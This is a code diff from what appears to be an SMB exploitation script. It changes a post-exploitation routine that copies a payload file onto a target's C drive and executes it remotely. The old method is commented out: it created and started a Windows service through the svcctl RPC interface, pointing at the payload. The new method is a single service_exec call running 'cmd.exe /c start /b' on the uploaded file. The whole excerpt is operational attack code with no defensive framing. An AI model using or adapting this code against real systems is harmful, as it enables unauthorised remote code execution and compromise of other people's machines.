@@ -1163,35 +1163,36 @@ def do_system_mysmb_session(conn, pipe_name, share, mode, payload_file):
     smbConn = conn.get_smbconnection()
     print("[*]Sending file to the the target...")
     smb_send_file(smbConn, payload_file, "C", f"/{payload_file}")
-    scmr = conn.get_dce_rpc("svcctl")
-    try:
-        scmr.connect()
-    except Exception as e:
-        print("[-] Failed to connect to svcctl RPC: %s" % str(e))
-        return
-    smbConn.setTimeout(10000)
-    scmr.bind(scmr_.MSRPC_UUID_SCMR)
-    resp = scmr_.hROpenSCManagerW(scmr)
-    scHandle = resp["lpScHandle"]
-
-    res = scmr_.hRCreateServiceW(
-        scmr,
-        scHandle,
-        service_name,
-        service_name,
-        lpBinaryPathName=f"C:\\{payload_file}",
-        dwStartType=scmr_.SERVICE_DEMAND_START,
-    )
-    service = res["lpServiceHandle"]
-    try:
-        print("[*] Starting ineractive shell...")
-        print("[!] Executing interactive programs will hang")
-        scmr_.hRStartServiceW(scmr, service)
-    except Exception as e:
-        print("[-] Failed to start service: %s" % str(e))
-        scmr_.hRDeleteService(scmr, service)
-        scmr_.hRCloseServiceHandle(scmr, service)
-        scmr_.hRCloseServiceHandle(scmr, scHandle)
+    service_exec(smbConn, f"cmd.exe /c start /b C:\\{payload_file}")
+    # scmr = conn.get_dce_rpc("svcctl")
+    # try:
+    #     scmr.connect()
+    # except Exception as e:
+    #     print("[-] Failed to connect to svcctl RPC: %s" % str(e))
+    #     return
+    # smbConn.setTimeout(10000)
+    # scmr.bind(scmr_.MSRPC_UUID_SCMR)
+    # resp = scmr_.hROpenSCManagerW(scmr)
+    # scHandle = resp["lpScHandle"]
+    #
+    # res = scmr_.hRCreateServiceW(
+    #     scmr,
+    #     scHandle,
+    #     service_name,
+    #     service_name,
+    #     lpBinaryPathName=f"C:\\{payload_file}",
+    #     dwStartType=scmr_.SERVICE_DEMAND_START,
+    # )
+    # service = res["lpServiceHandle"]
+    # try:
+    #     print("[*] Starting ineractive shell...")
+    #     print("[!] Executing interactive programs will hang")
+    #     scmr_.hRStartServiceW(scmr, service)
+    # except Exception as e:
+    #     print("[-] Failed to start service: %s" % str(e))
+    #     scmr_.hRDeleteService(scmr, service)
+    #     scmr_.hRCloseServiceHandle(scmr, service)
+    #     scmr_.hRCloseServiceHandle(scmr, scHandle)
     print('done.')
 
     # example of executing a file on the remote host
